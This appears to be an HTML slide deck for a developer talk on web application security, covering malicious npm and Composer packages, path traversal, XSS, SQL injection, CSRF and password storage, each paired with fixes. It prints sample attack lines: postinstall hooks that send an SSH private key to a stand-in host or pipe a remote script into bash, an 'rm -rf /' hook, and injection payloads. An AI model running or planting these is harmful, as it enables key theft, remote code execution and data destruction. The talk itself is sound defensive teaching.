@@ -1,0 +1,811 @@
+<!doctype html>
+<html lang="en" xmlns="http://www.w3.org/1999/html">
+<head>
+    <meta charset="utf-8">
+
+    <title>Your application is vulnerable</title>
+
+    <meta name="description" content="Slides for 'Your application is vulnerable' presentation">
+    <meta name="author" content="Dmytro Naumenko">
+
+    <meta name="apple-mobile-web-app-capable" content="yes"/>
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <link rel="stylesheet" href="css/all.css">
+
+    <script>
+        document.write('<link rel="stylesheet" href="node_modules/reveal.js/css/print/' + (window.location.search.match(/print-pdf/gi) ? 'pdf' : 'paper') + '.css" type="text/css" media="print">');
+    </script>
+</head>
+
+<body>
+<div class="reveal">
+    <div class="slides">
+        <section class="title-slide">
+            <h1>Your application is vulnerable</h1>
+
+            <div class="name">
+                <p><a href="https://github.com/SilverFire">Dmytro Naumenko</a></p>
+                <p>
+                    <small>
+                        <a href="http://hiqdev.com/">HiQDev,</a>
+                        <a href="http://www.yiiframework.com/">Yii core team</a>
+                    </small>
+                </p>
+            </div>
+        </section>
+
+        <section class="inverted" data-background="cheese.jpg">
+            <h2>I'm a Dev</h2>
+        </section>
+
+        <section>
+            <img src="Swiss_cheese_model_of_accident_causation.png" alt="">
+        </section>
+
+        <section>
+            <h4>Development changes daily!</h4>
+        </section>
+
+        <section>
+            <h3>Open Source</h3>
+
+            <img src="github-graph.png" alt="GitHub popularity growing graph"/>
+        </section>
+
+        <section>
+            <p>
+                <b>30%</b> of web-sites<br/>
+                are build of <b>open-source code</b><br/>
+                for 95% or more
+            </p>
+        </section>
+
+        <section>
+            <h4>What does open source give us?</h4>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">🍱 Variety</li>
+                <li class="fragment" data-fragment-index="2">📚 Knowledge & best practices</li>
+                <li class="fragment" data-fragment-index="3">🛠 Tooling</li>
+                <li class="fragment" data-fragment-index="4">🏎 Speed of development</li>
+                <li class="fragment" data-fragment-index="5">✨ Magic</li>
+            </ul>
+
+            <aside class="notes">
+                <ul>
+                    <li>изобилие библиотек для решения самых разных задач</li>
+                    <li>scratching a web-site with can be as easy as
+                        <pre class="highlight bash">npx create-react-app my-app</pre>
+                    </li>
+                    <li>absorbs best practices for years</li>
+                </ul>
+            </aside>
+        </section>
+
+        <section>
+            <h3>
+                <span class="fragment" data-fragment-index="5">Should</span><br/>
+                We Trust
+            </h3>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Developers</li>
+                <li class="fragment" data-fragment-index="2">Open Source</li>
+                <li class="fragment" data-fragment-index="3">Users</li>
+                <li class="fragment" data-fragment-index="3">Robots?</li>
+            </ul>
+
+            <aside class="notes">
+                <ul>
+                    <li>Trust more experienced developers from open-source world</li>
+                    <li>Trust users of open-source that support newbies</li>
+                    <li>Generally trust humans</li>
+                </ul>
+            </aside>
+        </section>
+
+        <section>
+            <h2>Open source</h2>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Written by experienced developers</li>
+                <li class="fragment" data-fragment-index="2">Followed by hundreds of eyes</li>
+                <li class="fragment" data-fragment-index="3">Used by thousands of developers</li>
+                <li class="fragment" data-fragment-index="4">Done with security in mind</li>
+                <li class="fragment" data-fragment-index="5">Save you from vulnerabilities</li>
+                <li class="fragment" data-fragment-index="6"><u>Bullshit.</u></li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Good tools</h3>
+
+            <img src="lock.jpeg" style="height: 60vh;"/>
+
+            <aside class="notes">Они есть, но всё равно нужно уметь пользоваться</aside>
+        </section>
+
+        <section>
+            <img src="bike_bad_lock.jpg"/>
+        </section>
+
+        <section>
+            <img src="bike_stolen.jpg"/>
+        </section>
+
+        <section>
+            <img style="width: 60vw" src="too_secure_bike.jpg"/>
+        </section>
+
+        <section>
+            <img style="width: 60vw" src="too_secure_bike_vulnerable.jpg"/>
+        </section>
+
+        <section>
+            <h3>Dependencies</h3>
+        </section>
+
+        <section>
+            <h4>JavaScript</h4>
+            <h2>NPM</h2>
+        </section>
+
+        <section>
+            <h4>NPM</h4>
+            <h3>Patch your libs</h3>
+
+            <img src="override.png" />
+
+            <aside class="notes">искать баг, вызванный таким переопределением из какой-нибудь зависимости в глубине иерархии</aside>
+        </section>
+
+        <section>
+            <h4>NPM</h4>
+            <h4>Send <s>reports</s> secrets</h4>
+
+            <pre class="highlight json">
+{
+    "name": "portionfatty12",
+    "description": "Treehouse API implementation",
+    "scripts": {
+        "postinstall":
+            "curl -X POST -d $(cat $HOME/.ssh/id_rsa) https://hax.io/pwnd"
+    }
+}
+            </pre>
+
+            <p><small><a href="https://github.com/malicious-packages/cemetery/tree/master/portionfatty12">portionfatty12</a></small></p>
+        </section>
+
+        <section>
+            <h4>NPM</h4>
+            <h4>Puppets you</h4>
+
+            <pre class="highlight json">
+{
+    "scripts": {
+        "postinstall": "curl --silent -o- https://malicious.io/hax.sh | bash",
+    }
+}
+            </pre>
+        </section>
+
+        <section>
+            <h4>NPM</h4>
+            <h3>Package takeover</h3>
+        </section>
+
+        <section>
+            <h3>Composer can do the same ;)</h3>
+
+            <pre class="highlight json">
+{
+    "scripts": {
+        "post-package-install": [
+            "rm -rf / cache"
+        ],
+    },
+}
+</pre>
+        </section>
+
+        <section>
+            <h3>Dependencies are vulnerable!</h3>
+
+            <h4>You don't know what exactly is vulnerable yet.</h4>
+        </section>
+
+        <section>
+            <p>Solutions</p>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">It's the price we pay for open source</li>
+                <li class="fragment" data-fragment-index="2">It's still better than closed-source</li>
+                <li class="fragment" data-fragment-index="3">Don't run with <kbd>sudo</kbd></li>
+                <li class="fragment" data-fragment-index="4">Pray</li>
+                <li class="fragment" data-fragment-index="5">Use security advisories:
+                    <a href="https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities">NPM audit</a>,
+                    <a href="https://github.com/Roave/SecurityAdvisories">PHP Roave/SecurityAdvisories</a>
+                </li>
+                <li class="fragment" data-fragment-index="6">
+                    Update dependencies
+                    (<a href="https://help.github.com/en/articles/opting-into-or-out-of-data-use-for-your-private-repository">automatically</a>)
+                </li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Never <i>blindly</i> trust<br/> Open source</h3>
+        </section>
+
+        <section>
+            <h3>Users</h3>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Produce input</li>
+                <li class="fragment" data-fragment-index="2">Expect output</li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Input</h3>
+
+            <ul>
+                <li>Forms</li>
+                <li>Files</li>
+                <li>HTTP Headers</li>
+                <li>...</li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Output</h3>
+
+            <ul>
+                <li>Browser</li>
+                <li>Console</li>
+                <li>Database</li>
+                <li>Native application</li>
+                <li>...</li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Problems</h3>
+
+            <ul>
+                <li>Insufficient input filtering</li>
+                <li>Insufficient output escaping</li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Well-known<br /> but amazingly popular!</h3>
+        </section>
+
+        <section>
+            <h4>Input filtering</h4>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Making sure data is valid</li>
+                <li class="fragment" data-fragment-index="2">Whitelist first</li>
+                <li class="fragment" data-fragment-index="3">Use reliable filters</li>
+            </ul>
+        </section>
+
+        <section>
+            <pre class="highlight php">
+function getFile(string $uuid): resource
+{
+    $fh = fopen($_ENV['file_uploads_dis'] . '/' . $uuid);
+    if ($fh === false) {
+        throw new FileDoesNotExistException($uuid);
+    }
+
+    return $fh;
+}
+            </pre>
+
+            <pre class="highlight php fragment" data-fragment-index="1">
+getFile('../../../../.env');
+
+// Returns your raw passwords, please
+            </pre>
+        </section>
+
+        <section>
+            <img src="traversal.png" alt="">
+        </section>
+
+        <section>
+            <p>Solution</p>
+
+            <h3>Filter input</h3>
+        </section>
+
+        <section>
+            <h2>Validate</h2>
+
+            <pre class="highlight php">
+function getFile(string $uuid): resource
+{
+<span class="fragment mark-current" data-fragment-index="1">    if (!preg_match('/^\w{8}-\w{4}-\w{4}-\w{4}-\w{12}$/', $uuid, $m)) {
+        throw new InvalidArgumentException($uuid);
+    }</span>
+
+    $fh = fopen($_ENV['file_uploads_dis'] . '/' . $fileId);
+    if ($fh === false) {
+        throw new FileDoesNotExistException($uuid);
+    }
+
+    return $fh;
+}
+            </pre>
+        </section>
+
+        <section>
+            <h3>Enforce validation</h3>
+
+            <pre class="highlight php">
+function getFile(<span class="fragment mark-current" data-fragment-index="1">UuidInterface $uuid</span>): resource
+{
+    $fh = fopen($_ENV['file_uploads_dis'] . '/' . $uuid->toString());
+    if ($fh === false) {
+        throw new FileDoesNotExistException($uuid);
+    }
+
+    return $fh;
+}
+            </pre>
+        </section>
+
+        <section>
+            <h4>Output escaping</h4>
+
+            <p class="fragment" data-fragment-index="1">Making special characters behave like normal characters.</p>
+            <p class="fragment" data-fragment-index="2">Usually by prefixing with another special character.</p>
+            <p class="fragment" data-fragment-index="3">Different outputs – different escaping rules.</p>
+        </section>
+
+        <section>
+            <h3>Common threats</h3>
+        </section>
+
+        <section>
+            <h1>XSS</h1>
+
+            <p>Inject JavaScript code and execute in user's browser</p>
+        </section>
+
+        <section>
+            <img src="twitter_xss.png" alt="">
+
+            <blockquote>
+                Cross-site scripting (XSS) continued to be the most common vulnerability reported across all industries
+            </blockquote>
+            – <a href="https://www.hackerone.com/blog/118-Fascinating-Facts-HackerOnes-Hacker-Powered-Security-Report-2018">HackerOne 2018 report</a>
+        </section>
+
+        <section>
+            <pre class="highlight html">
+                ...
+&lt;header&gt;
+    &lt;?= $_GET[&apos;search_query&apos;] ?&gt;
+&lt;/header&gt;
+...
+            </pre>
+
+            <pre class="highlight fragment" data-fragment-index="1">GET http://example.com/?search_query=&lt;script&gt;alert(1)&lt;/script&gt;</pre>
+
+            <ul>
+                <li class="fragment" data-fragment-index="2">Session stealing</li>
+                <li class="fragment" data-fragment-index="3">Account takeover</li>
+                <li class="fragment" data-fragment-index="4">Site defacement</li>
+                <li class="fragment" data-fragment-index="5">Key logging</li>
+                <li class="fragment" data-fragment-index="6">Malicious software download</li>
+            </ul>
+        </section>
+
+        <section>
+            <h4>Two types:</h4>
+            <ul>
+                <li class="fragment" data-fragment-index="1">
+                    <b>Reflected XSS:</b> pass unvalidated and unescaped input derectly to output
+                </li>
+                <li class="fragment" data-fragment-index="2">
+                    <b>Stored XSS:</b> store malicious input and output it later
+                </li>
+            </ul>
+
+            <aside class="notes">
+                The user interacts with some malicious link on websites, in ads
+                The application or API stores unsanitized user input that is viewed at a later time by another user or
+                an administrator.
+            </aside>
+        </section>
+
+        <section>
+            <p>Solution</p>
+
+            <h3>Escape output</h3>
+        </section>
+
+        <section>
+            <h3>Text only?</h3>
+
+            <p>Convert special characters to HTML entities.<br />
+                <small>PHP – <a href="https://secure.php.net/manual/en/function.htmlspecialchars.php">htmlspecialchars</a></small>
+            </p>
+
+            <pre class="highlight html">
+
+&lt;script&gt;alert(1)&lt;/script&gt;
+    →
+&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+
+</pre>
+        </section>
+
+        <section>
+            <h3>HTML markup</h3>
+
+            <p>Sanitize output<br />
+                <small>PHP – <a href="http://htmlpurifier.org/">htmlpurifier.org</a></small>
+            </p>
+        </section>
+
+        <section>
+            <h4>Don't save escaped input to DB</h4>
+            <p>It's useless</p>
+        </section>
+
+        <section>
+            <h3>SQL injection</h3>
+
+            <p>Also a problem of unescaped output</p>
+        </section>
+
+        <section>
+            <img src="ho_uuid_sql.png" alt="">
+            <img src="ho_uuid_code.png" alt="">
+        </section>
+
+        <section>
+            <pre class="highlight php">
+$id = $_GET['id'];
+query("SELECT * FROM user WHERE id = $id");
+</pre>
+            <pre class="highlight fragment" data-fragment-index="1">GET http://example.com/?search_query=1; DROP TABLE user</pre>
+            <pre class="highlight fragment" data-fragment-index="2">SELECT * FROM user WHERE id = 1; DROP TABLE user</pre>
+
+        </section>
+
+        <section>
+            <h3>Use prepared statements</h3>
+
+            <p>PDO example:</p>
+
+            <pre class="highlight php fragment" data-fragment-index="1">
+$query = $db->prepare("SELECT * FROM user WHERE id = :id");
+$query->bindValue(':id', $id);
+$query->fetch();
+</pre>
+        </section>
+
+        <section>
+            <h2>CSRF</h2>
+
+            <p>Submit forms your website from other website on behalf of the user</p>
+        </section>
+
+        <section>
+            <h3>How?</h3>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Login to <u>mybanking.com</u></li>
+                <li class="fragment" data-fragment-index="2">You visit <u>evil.org</u></li>
+            </ul>
+
+<pre class="highlight html fragment" data-fragment-index="3">
+&lt;form action=&quot;https://mybanking.com/payment&quot;
+    method=&quot;POST&quot; onload=&quot;this.submit()&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;card_number&quot; value=&quot;5432 1098 7654 3210&quot; /&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;100&quot; /&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;currency&quot; value=&quot;USD&quot; /&gt;
+&lt;/form&gt;
+</pre>
+        </section>
+
+        <section>
+            <img src="uber_csrf.png" alt="">
+        </section>
+
+        <section>
+            <img src="uber_csrf1.png" alt="">
+        </section>
+
+        <section>
+            <p>Solution</p>
+
+            <h3>CSRF tokens</h3>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Generate random token serverside</li>
+                <li class="fragment" data-fragment-index="2">Include in all forms</li>
+                <li class="fragment" data-fragment-index="3">Check on submission</li>
+                <li class="fragment" data-fragment-index="4">Reissue after usage</li>
+                <li class="fragment" data-fragment-index="5">Backend frameworks can do it out of box</li>
+                <li class="fragment" data-fragment-index="6">Frontend frameworks are less vulnerable</li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Never trust users!</h3>
+        </section>
+
+        <section>
+            <h3>Developers</h3>
+
+            <img src="trust_engineers.jpg" class="fragment" data-fragment-index="1" />
+
+            <aside class="notes">
+                We can do well on backend
+            </aside>
+        </section>
+
+        <section>
+            <h2>Passwords</h2>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Brute force and dictionary attack</li>
+                <li class="fragment" data-fragment-index="2">Leaks</li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Brute force</h3>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Limit RPM by IP and login</li>
+                <li class="fragment" data-fragment-index="2">Show captcha</li>
+                <li class="fragment" data-fragment-index="3">Monitor and alert</li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Leaks</h3>
+
+            <img src="fb_password_leak.png" alt="">
+            <img src="fb_plaintext.png" alt="">
+            <img src="fb_many_users.png" alt="">
+        </section>
+
+        <section>
+            <p>Solutions</p>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Store passwords correctly</li>
+                <li class="fragment" data-fragment-index="2">Do not log passwords</li>
+                <li class="fragment" data-fragment-index="3">Do not send passwords plaintext</li>
+            </ul>
+        </section>
+
+        <section>
+            <p>How to store passwords?</p>
+
+            <h4>Hashing (even with salt) is a bad idea!</h4>
+        </section>
+
+        <section>
+            <p>Popular hash functions</p>
+            <h5>crc32, md5, sha128, sha256, sha512</h5>
+
+            <h4>are meant to be <u>fast</u></h4>
+        </section>
+
+        <section>
+            <p>Cryptographic hash functions</p>
+            <h5>PBKDF2, bcrypt, scrypt</h5>
+
+            <h4>are meant to be <u>slow</u></h4>
+        </section>
+
+        <section>
+            <p>8-chars of <kbd>[A-Za-z0-9]</kbd> give 62<sup>8</sup> unique passwords <small><a href="https://stackoverflow.com/questions/50174840/how-many-8-character-password-are-there">[1]</a></small></p>
+
+            <br />
+            <p class="fragment" data-fragment-index="1">8x Nvidia GTX 1080 GPU cards benchmark <small><a href="https://gist.github.com/epixoip/a83d38f412b4737e99bbef804a270c40">[2]</a></small>:</p>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1"><b>md5</b> – 200 GH/s, 18 minutes</li>
+                <li class="fragment" data-fragment-index="2"><b>sha256</b> – 23012 MH/s, 2.5 hours</li>
+                <li class="fragment" data-fragment-index="3"><b>bcrypt</b> – 105 kH/s, 66 years</li>
+                <li class="fragment" data-fragment-index="4"><b>PBKDF2-HMAC-SHA512</b> – 3450 kH/s, 3 years</li>
+                <li class="fragment" data-fragment-index="5"><b>Argon2</b> – GPU is useless</li>
+            </ul>
+
+            <aside class="notes">
+                argon2 requires lots of memory access which spoils parallelism,
+                complexity can be adjusted with iterations,
+                a lot of free GPUs after mining
+            </aside>
+        </section>
+
+        <section>
+            <p>Strong hash function only gives you time to react</p>
+        </section>
+
+        <section>
+            <h4>Never implement cryptographic on your own!</h4>
+
+            <p>
+                <a href="https://www.happybearsoftware.com/you-are-dangerously-bad-at-cryptography.html">You are dangerously bad at cryptography</a>
+            </p>
+        </section>
+
+        <section>
+            <h3>Broken Access Control</h3>
+        </section>
+
+        <section>
+            <img src="starbucks_gift.png" alt="">
+        </section>
+
+        <section>
+            <ul>
+                <li class="fragment" data-fragment-index="1">Insufficient permission checks</li>
+                <li class="fragment" data-fragment-index="2">Insecure direct object reference</li>
+                <li class="fragment" data-fragment-index="3">Open resources</li>
+                <li class="fragment" data-fragment-index="5">Information leaks</li>
+            </ul>
+
+            <aside class="notes">
+                Whitelist-based development, debug pages, error pages, API can supply extra information, open ports, default passwords
+            </aside>
+        </section>
+
+        <section>
+            <p>Solutions</p>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Whitelist-based development</li>
+                <li class="fragment" data-fragment-index="2">Negative tests</li>
+                <li class="fragment" data-fragment-index="3">UUID ≠ security</li>
+                <li class="fragment" data-fragment-index="4"><s>Security through obscurity</s></li>
+                <li class="fragment" data-fragment-index="5">Disable debug output</li>
+                <li class="fragment" data-fragment-index="6">Even when app crashes</li>
+            </ul>
+        </section>
+
+        <section>
+            <p>Solutions</p>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Change default passwords</li>
+                <li class="fragment" data-fragment-index="2">Whitelist-based ingress firewalls</li>
+                <li class="fragment" data-fragment-index="3">Egress firewalls</li>
+                <li class="fragment" data-fragment-index="4">Services isolation</li>
+                <li class="fragment" data-fragment-index="5">Store backups securely</li>
+                <li class="fragment" data-fragment-index="6">Deliver dev-dumps securely</li>
+            </ul>
+        </section>
+
+        <section>
+            <h4>Credentials</h4>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Don's store in repository</li>
+                <li class="fragment" data-fragment-index="2">Use .env</li>
+                <li class="fragment" data-fragment-index="3">Or better <a href="https://www.vaultproject.io/">HashiCorp Vault</a></li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Server-side</h3>
+
+            <p>Solutions</p>
+
+            <ul>
+                <li>Update dependencies</li>
+                <li class="fragment" data-fragment-index="1">Log everything</li>
+                <li class="fragment" data-fragment-index="2">Or at least mutable requests</li>
+                <li class="fragment" data-fragment-index="3">Separate logging topics</li>
+                <li class="fragment" data-fragment-index="4">Use remote append-only storage</li>
+                <li class="fragment" data-fragment-index="5">Monitor suspicious activity</li>
+                <li class="fragment" data-fragment-index="6">Alert on automatic scans</li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Never trust developers!</h3>
+        </section>
+
+        <section>
+            <h3>Physical security</h3>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Encrypt laptops and PC</li>
+                <li class="fragment" data-fragment-index="2">Lock device when leave</li>
+                <li class="fragment" data-fragment-index="3">
+                    Don't plug unknown USB drives :)
+                    <img src="usb_killer.jpg" style="width: 40vw" />
+                </li>
+            </ul>
+        </section>
+
+        <section>
+            <h2>It's all vulnerable!</h2>
+        </section>
+
+        <section>
+            <h2>What to do on Monday?</h2>
+
+            <ul>
+                <li class="fragment" data-fragment-index="1">Discuss this talk with your team</li>
+                <li class="fragment" data-fragment-index="2">
+                    Schedule
+                    <a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents">OWASP Testing Guide</a>
+                    checkup
+                </li>
+                <li class="fragment" data-fragment-index="3">Schedule a &laquo;What if?&raquo; game</li>
+                <li class="fragment" data-fragment-index="4">
+                    Raise awareness.<br />
+                    Suggest reading <a href="https://leanpub.com/web-hacking-101">Web Hacking 101</a>
+                </li>
+            </ul>
+        </section>
+
+        <section>
+            <h3>Let's make a safer world!</h3>
+        </section>
+
+        <section>
+            <h3>Robots?</h3>
+
+            <img class="fragment" data-fragment-index="1" src="im_not_a_robot.gif" />
+        </section>
+
+        <section class="final-slide">
+            <h1>Questions time</h1>
+        </section>
+    </div>
+</div>
+
+<script src="js/all.js"></script>
+
+<script>
+    // Full list of configuration options available here:
+    // https://github.com/hakimel/reveal.js#configuration
+    Reveal.initialize({
+        controls: true,
+        progress: true,
+        history: true,
+        center: true,
+        margin: 0.1,
+        slideNumber: true,
+
+        theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+        transition: Reveal.getQueryHash().transition || 'none', // default/cube/page/concave/zoom/linear/fade/none
+
+        // Optional libraries used to extend on reveal.js
+        dependencies: [
+            {
+                src: 'js/reveal/highlight/highlight.js',
+                async: true,
+                callback: function () {
+                    [].forEach.call(document.querySelectorAll('.highlight, code'), function (v, i) {
+                        hljs.highlightBlock(v);
+                    });
+                },
+            },
+            {src: 'js/reveal/notes/notes.js', async: true},
+        ],
+    });
+</script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-135109722-1"></script>
+<script>window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);};gtag('js', new Date());gtag('config', 'UA-135109722-1');</script>
+</body>
+</html>
